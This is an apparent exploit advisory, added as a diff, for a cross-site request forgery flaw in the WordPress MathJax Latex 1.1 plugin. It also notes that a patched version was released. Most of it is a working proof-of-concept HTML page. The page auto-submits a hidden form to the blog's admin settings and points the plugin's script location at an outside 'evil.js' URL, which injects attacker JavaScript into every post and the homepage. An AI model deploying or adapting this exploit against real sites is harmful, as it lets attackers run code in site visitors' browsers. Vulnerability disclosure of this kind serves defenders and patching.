@@ -1,0 +1,32 @@
+# Title: Wordpress Mathjax Latex 1.1 Cross-Site Request Forgery Vulnerability
+# Release Date: 25/03/13
+# Author: Junaid Hussain [ illSecure Research Group ] 
+# Contact: illSecResearchGroup@Gmail.com | Website: illSecure.com
+# Software Link: http://downloads.wordpress.org/plugin/mathjax-latex.1.1.zip
+# Tested on CentOs 5 - Wordpress Version 3.5
+----------------------------------------------------------------------------------------------------------
+There is no CSRF protection on the mathjax option page. This allows an attacker to specify arbitrary 
+javascript that will be loaded with each post and also loaded onto the homepage of the wordpress blog
+----------------------------------------------------------------------------------------------------------
+//##### CSRF - Proof Of Concept:
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<form id="mathjaxlatex" name="mathjaxlatex" action="http://[DOMAINNAME]/wp-admin/options-general.php?page=mathjax-latex.php" method='POST'>
+<input type="hidden" name="mathjax_hidden" style="display:none;" value="Y">
+<input type="checkbox" name="force_load" style="display:none;" value="1"CHECKED/>
+<input type="checkbox" name="default_disabled" style="display:none;" value="1"CHECKED/>
+<input type='textbox' name='mathjax_location' class='regular-text code' value='http://illsecure.com/code/evil.js' style="display:none;"/>       
+</form>
+</html>
+----------------------------------------------------------------------------------------------------------
+//##### Patch:
+The Vendor Was notified and a patch was released:
+--- Patched Version: http://downloads.wordpress.org/plugin/mathjax-latex.1.2.1.zip
+--- See ChangeLog: http://wordpress.org/extend/plugins/mathjax-latex/changelog/
+----------------------------------------------------------------------------------------------------------
+Contact: illSecResearchGroup@gmail.com 
+- Junaid Hussain
+- http://illsecure.com
+----------------------------------------------------------------------------------------------------------
+
+
